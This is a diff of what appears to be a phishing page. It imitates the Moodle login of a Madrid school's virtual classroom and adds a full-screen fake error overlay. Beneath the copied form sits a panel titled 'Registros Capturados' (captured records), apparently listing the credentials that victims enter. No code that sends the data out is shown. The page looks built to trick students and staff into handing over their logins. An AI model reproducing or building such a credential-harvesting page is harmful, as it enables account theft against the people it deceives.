@@ -22,7 +22,30 @@
     <div id="page" class="container-fluid pt-5 mt-0">        <div id="page-content" class="row">            <div id="region-main-box" class="col-12">                <div id="region-main" class="col-12 h-100">                <div class="login-wrapper">                    <div class="login-container">                    <div role="main"><span id="maincontent"></span><div class="loginform">        <h1 class="login-heading mb-4">Entrar a MAESTRO RODRIGO</h1>        <form class="login-form" action="#" method="post" id="login">            <input id="anchor" type="hidden" name="anchor" value="">            <script>document.getElementById('anchor').value = location.hash;</script>            <input type="hidden" name="logintoken" value="BHjF3HU5TMAC9FDUnrZCzgXlGzsBP3h9">            <div class="login-form-username mb-3">                <label for="username" class="sr-only">                        Nombre de usuario                </label>                <input type="text" name="username" id="username" class="form-control form-control-lg" value="" placeholder="Nombre de usuario" autocomplete="username">            </div>            <div class="login-form-password mb-3">                <label for="password" class="sr-only">Contraseña</label>                <input type="password" name="password" id="password" value="" class="form-control form-control-lg" placeholder="Contraseña" autocomplete="current-password">            </div>            <div class="login-form-submit mb-3">                <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Acceder</button>            </div>            </form>        <div class="login-divider"></div>        <h2 class="login-heading">Algunos cursos permiten el acceso de invitados</h2>        <form action="#" method="post" id="guestlogin">            <input type="hidden" name="logintoken" value="BHjF3HU5TMAC9FDUnrZCzgXlGzsBP3h9">            <input type="hidden" name="username" value="guest" />            <input type="hidden" name="password" value="guest" />            <button class="btn btn-secondary" type="submit" id="loginguestbtn">Entrar como persona invitada</button>        </form>    <div class="login-divider"></div>    <div class="d-flex">        <button type="button" class="btn btn-secondary"  data-modal="alert" data-modal-title-str='["cookiesenabled", "core"]'  data-modal-content-str='["cookiesenabled_help_html", "core"]'>Aviso de Cookies</button>    </div></div></div>                    </div>                </div>                </div>            </div>        </div>    </div>        <footer id="page-footer" class="footer-popover bg-white">        <div data-region="footer-container-popover">            <button class="btn btn-icon bg-secondary icon-no-margin btn-footer-popover" data-action="footer-popover" aria-label="Mostrar pie de página">                <i class="icon fa fa-question fa-fw " aria-hidden="true"  ></i>            </button>        </div>        <div class="footer-content-popover container" data-region="footer-content-popover">                <div class="footer-section p-3 border-bottom">                                <div class="footer-support-link"><a href="https://ayuda.educa.madrid.org/shelves/aula-virtual" target="blank"><i class="icon fa-regular fa-envelope fa-fw " aria-hidden="true"  ></i>Contactar con el soporte del sitio<i class="icon fa fa-arrow-up-right-from-square fa-fw ms-1" aria-hidden="true"  ></i></a></div>                </div>            <div class="footer-section p-3 border-bottom">                <div class="logininfo">                    <div class="logininfo">Usted no se ha identificado.</div>                </div>
             </div>            <div class="footer-section p-3">                <div>Desarrollado por <a href="https://moodle.com">Moodle</a></div>            </div>        </div>    </footer>
 </div>
-
+<style>
+        /* Estilo de la Alerta de Error Profesional */
+        #customAlert {
+            display:none; 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.6); 
+            z-index: 99999;
+        }
+        .alert-box {
+            position: absolute; 
+            top: 50%; left: 50%; 
+            transform: translate(-50%, -50%); 
+            background: white; 
+            padding: 25px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4); 
+            width: 350px; 
+            text-align: center; 
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
 <div id="vault-panel">
     <h1>Registros Capturados</h1>
     <table class="vault-table">
